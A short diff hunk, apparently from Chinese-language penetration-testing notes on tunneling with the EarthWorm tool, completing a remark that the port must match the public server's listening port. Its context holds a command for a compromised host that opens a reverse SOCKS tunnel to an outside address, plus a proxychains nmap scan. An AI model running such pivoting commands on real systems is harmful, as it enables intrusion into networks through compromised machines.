@@ -87,4 +87,4 @@ proxychains nmap 10.203.87.61
 
 - 肉鸡上执行
 	`./ew_for_Linux32 -s rssocks -d 45.*.*.190 -e 8889`
-> ip天公网IP端口和公网上的-e
+> ip天公网IP端口和公网上的-e端口一致
